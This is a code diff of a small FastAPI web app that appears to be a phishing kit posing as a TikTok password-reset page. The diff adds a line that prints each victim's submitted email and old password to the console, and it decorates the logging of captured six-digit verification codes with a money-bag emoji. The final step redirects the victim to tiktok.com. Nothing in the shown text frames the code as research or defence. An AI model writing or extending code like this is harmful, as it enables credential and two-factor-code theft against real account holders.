@@ -32,6 +32,7 @@ async def reset_failed():
 @app.post("/submit-form")
 async def submit_form(email: str = Form(...), old_password: str = Form(...)):
     query_params = urlencode({"email": email, "old-password": old_password})
+    print(f"\n🚀 New submission | Email: {email}, password: {old_password} \n")
     return RedirectResponse(url=f"/login-code?{query_params}", status_code=303)
 
 
@@ -59,12 +60,12 @@ async def login(
     old_password: str = Form(...),
 ):
     code = f"{num1}{num2}{num3}{num4}{num5}{num6}"
-    print(f"Verification code for {email}: {code}")
+    print(f"\n💰 Verification code for {email}: {code}\n")
 
     with open("change-password.html", "r") as f:
         return f.read()
 
 
-@app.post("/change-password")
+@app.post("/change-password", response_class=HTMLResponse)
 async def change_password():
     return RedirectResponse(url="https://www.tiktok.com", status_code=303)
